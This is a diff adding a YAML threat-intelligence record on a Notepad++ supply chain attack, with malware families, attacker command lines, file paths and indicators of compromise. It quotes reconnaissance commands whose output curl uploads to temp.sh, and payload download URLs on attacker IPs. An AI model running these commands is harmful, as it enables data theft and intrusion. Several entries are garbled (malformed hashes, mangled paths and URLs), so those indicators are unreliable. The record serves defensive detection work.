@@ -1,0 +1,128 @@
+description: Notepad++ supply chain attack involving multiple infection chains and
+  payloads targeting various organizations.
+malware_families:
+- Cobalt Strike Beacon
+- Chrysalis backdoor
+- TrojanWin32 Generic
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - GUP.exe
+  - ProShow.exe
+  - script.exe
+  - BluetoothService.exe
+  - emd.exe
+  commandline:
+  - cmd /c whoami&&tasklist > 1.txt
+  - curl.exe -F "file=@1.txt" -s https://temp.sh/upload
+  - curl.exe --user-agent "https://temp.sh/ZMRKV/1.txt" -s http://45.76.155[.]202
+  - '%appdata%\ProShow\ProShow.exe'
+  - '%APPDATA%\Adobe\Scripts\script.exe %APPDATA%\Adobe\Scripts\alien.ini'
+  - cmd /c "whoami&&tasklist&&systeminfo&&netstat -ano" > a.txt
+  - cmd /c whoami >> a.txt
+  - cmd /c tasklist >> a.txt
+  - cmd /c systeminfo >> a.txt
+  - cmd /c netstat -ano >> a.txt
+  - curlexe -fle=@1 o -s https://temp.shiuploadURL
+  - CiUsers\\user.ca\\AppData\\Roaming\\Bluetooth\\BluetoothService.exe
+  - tasklist&systeminfo&netstat -ano > atxt
+  - CiUsers\\user.ca\\AppData\\Roaming|Bluetooth\\Bluetoothservioe exe
+  powershell: []
+  scripting_engine: []
+  registry_keys:
+  - HKU\\S-1-6-21-918903957-4277594133-949637555-1232ASOF TWARE\\Microsoft
+  image_load:
+  - load
+  - alien.dll
+  - lua5.1.dll
+  - log.dll
+  - BluetoothService
+  network_connections:
+  - http://45.76.155[.]202/update/update.exe
+  - https://temp.sh/upload
+  - http://45.76.155[.]202/list
+  - https://cdncheck.it[.]com/users/admin
+  - https://cdncheck.it[.]com/api/update/v1
+  - https://cdncheck.it[.]com/api/FileUpload/submit
+  - https://safe-dns.it[.]com/help/Get-Start
+  - https://safe-dns.it[.]com/resolve
+  - https://safe-dns.it[.]com/dns-query
+  - cmd.exe
+  - https://temp.shiuploadURL
+  - BluetoothService.exe
+  file_activity:
+  - '%appdata%\ProShow\1.txt'
+  - '%appdata%\ProShow\ProShow.exe'
+  - '%appdata%\ProShow\defscr'
+  - '%appdata%\ProShow\if.dnt'
+  - '%appdata%\ProShow\proshow.crs'
+  - '%appdata%\ProShow\proshow.phd'
+  - '%appdata%\ProShow\proshow_e.bmp'
+  - '%appdata%\ProShow\load'
+  - '%APPDATA%\Adobe\Scripts\alien.dll'
+  - '%APPDATA%\Adobe\Scripts\lua5.1.dll'
+  - '%APPDATA%\Adobe\Scripts\script.exe'
+  - '%APPDATA%\Adobe\Scripts\alien.ini'
+  - '%appdata%\Bluetooth\BluetoothService.exe'
+  - '%appdata%\Bluetooth\log.dll'
+  - '%appdata%\Bluetooth\BluetoothService'
+  - C:\\Windows\\SysWOWSS\\emd.exe
+  - CiUsers\\user.ca\\AppData\\Roaming\\Bluetooth\\BluetoothService.exe
+  persistence:
+  - Registry modified to run BluetoothService.exe on startup
+  process_relations:
+  - GUP.exe -> update.exe
+  - update.exe -> ProShow.exe
+  - script.exe -> alien.ini
+  - BluetoothService.exe -> log.dll
+  - cmd.exe -> tasklist&systeminfo&netstat -ano > atxt
+  - BluetoothService.exe
+IOCs:
+  hashes:
+  - 8e6e505438c21f3d281e1cc257abdbf7223b7f5a
+  - 90e677d7ff5844407b9c073e3b7e896e078e11cd
+  - 573549869e84544e3ef253bdba79851dcde4963a
+  - 13179c8f19fbf3d8473c49983a199e6cb4f318f0
+  - 4c9aac447bf732acc97992290aa7a187b967ee2c
+  - 821c0cafb2aab0f063ef7e313f64313fc81d46cd
+  - d7ffd7b588880cf61b603346a3557e7cce648c93
+  - 21a942273c14e4b9d3faa58e4de1fd4d5014a1ed
+  - f7910d943a013eede24ac89d6388c1b98f8b3717
+  - 7e0790226ea461bcc9ecd4be3c315ace41e1c122
+  - 119207866480620a856204
+  - b35e
+  - 4dE95ecbaeds2262306d63d8U06e
+  - '4035061'
+  - '507506457'
+  - '41081'
+  - 05420288
+  ip_addresses:
+  - 179.174.43.1
+  - 101.102.198.59
+  domains:
+  - temp.sh
+  - cdncheck.it
+  - self-dns.it
+  - safe-dns.it
+  - api.wiresguard.com
+  urls:
+  - http://45.76.155[.]202/update/update.exe
+  - https://temp.sh/upload
+  - http://45.76.155[.]202/list
+  - https://cdncheck.it[.]com/users/admin
+  - https://cdncheck.it[.]com/api/update/v1
+  - https://cdncheck.it[.]com/api/FileUpload/submit
+  - https://safe-dns.it[.]com/help/Get-Start
+  - https://safe-dns.it[.]com/resolve
+  - https://safe-dns.it[.]com/dns-query
+  - http://95.179.213[.]0/update/install.exe
+  - http://95.179.213[.]0/update/update.exe
+  - http://95.179.213[.]0/update/AutoUpdater.exe
+  - https://temp.shiuploadURL
+authors:
+- Georgy Kucherin
+- Anton Kargin
+reference: https://securelist.com/notepad-supply-chain-attack/118708
+date_of_publication: February 03, 2026
+file_creation_date: February 05, 2026
